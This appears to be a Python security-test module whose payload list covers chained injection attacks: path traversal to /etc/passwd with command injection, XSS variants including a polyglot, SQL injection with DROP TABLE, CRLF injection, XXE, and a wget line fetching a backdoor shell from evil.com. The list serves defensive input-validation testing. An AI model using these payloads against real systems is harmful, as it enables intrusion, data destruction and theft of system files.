"""
Combined attack testing module.

Tests for chained/combined attack vectors that use multiple techniques.
"""

from typing import List, Tuple
from tests.security.core.base_tester import BaseSecurityTester


class CombinedAttackTester(BaseSecurityTester):
    """Tests for combined/chained attack vulnerabilities."""
    
    def get_test_name(self) -> str:
        """Get the name of this test category."""
        return "Combined Attacks"
    
    def get_payloads(self) -> List[Tuple[str, str]]:
        """Get combined attack test payloads."""
        return [
            # Path traversal + command injection
            ("../../../etc/passwd; whoami", 
             "Path traversal + command injection"),
            ("..\\..\\windows\\system32\\cmd.exe && dir",
             "Windows path + command"),
            
            # XSS + Unicode
            ("<script>alert('Ｘ𝕊𝕊')</script>", 
             "XSS with Unicode characters"),
            ("＜script＞alert(1)＜/script＞", 
             "Full-width XSS"),
            
            # SQL injection + XSS
            ("'; DROP TABLE users; <script>alert(1)</script>--",
             "SQL injection + XSS"),
            ("1' UNION SELECT '<img src=x onerror=alert(1)>'--",
             "SQL injection returning XSS"),
            
            # Command injection + overflow
            (";" + "A" * 10000 + "; whoami",
             "Command injection with overflow"),
            ("|" * 1000 + " id",
             "Pipe overflow + command"),
            
            # Unicode + path traversal
            ("..／..／..／etc／passwd",
             "Unicode slash in path traversal"),
            ("．．/．．/．．/etc/passwd",
             "Unicode dots in path"),
            
            # XSS + null bytes
            ("<script>alert(1)</script>\x00",
             "XSS with null terminator"),
            ("\x00<img src=x onerror=alert(1)>",
             "Null prefix XSS"),
            
            # Format string + command injection
            ("%s%s%s; whoami",
             "Format string + command"),
            ("%x%x%x && ls -la",
             "Format hex + command"),
            
            # Overflow + Unicode
            ("𝕏" * 10000 + "\u200b",
             "Unicode overflow + zero-width"),
            ("A" * 5000 + "а" * 5000,
             "Mixed script overflow"),
            
            # Directory traversal + XSS
            ("../uploads/<script>alert(1)</script>",
             "Path traversal to XSS file"),
            ("../../template.php?xss=<img src=x>",
             "Path traversal with XSS param"),
            
            # Rate limiting bypass + attack
            ("SLOW_REQUEST_WITH_PAYLOAD",
             "Slow request with attack"),
            ("DISTRIBUTED_ATTACK_PATTERN",
             "Distributed attack pattern"),
            
            # Encoding bypass chains
            ("%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64",
             "URL encoded path traversal"),
            ("&#x2e;&#x2e;&#x2f;&#x65;&#x74;&#x63;",
             "HTML entity encoded path"),
            
            # Multi-stage attacks
            ("echo '<script>' > /tmp/xss.html",
             "Command creating XSS file"),
            ("wget http://evil.com/shell.php -O backdoor.php",
             "Command downloading backdoor"),
            
            # Polyglot attacks
            ("';alert(String.fromCharCode(88,83,83))//\\';alert(String."
             "fromCharCode(88,83,83))//\";alert(String.fromCharCode"
             "(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))"
             "//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode"
             "(88,83,83))</SCRIPT>",
             "XSS polyglot"),
            
            # CRLF + XSS
            ("\r\nContent-Type: text/html\r\n\r\n<script>alert(1)"
             "</script>",
             "CRLF injection + XSS"),
            
            # XML injection + XXE
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test '
             'SYSTEM "file:///etc/passwd">]><root>&test;</root>',
             "XML injection with XXE"),
        ]
    
    def test_chained_attack(
        self, 
        attacks: List[str], 
        target_func
    ) -> dict:
        """Test a chain of attacks in sequence."""
        results = []
        
        for i, attack in enumerate(attacks):
            try:
                result = target_func(attack)
                results.append({
                    "step": i + 1,
                    "attack": attack,
                    "success": True,
                    "result": result
                })
            except Exception as e:
                results.append({
                    "step": i + 1,
                    "attack": attack,
                    "success": False,
                    "error": str(e)
                })
                # Stop chain if an attack fails
                break
                
        return {
            "chain_length": len(attacks),
            "completed_steps": len(results),
            "chain_results": results
        }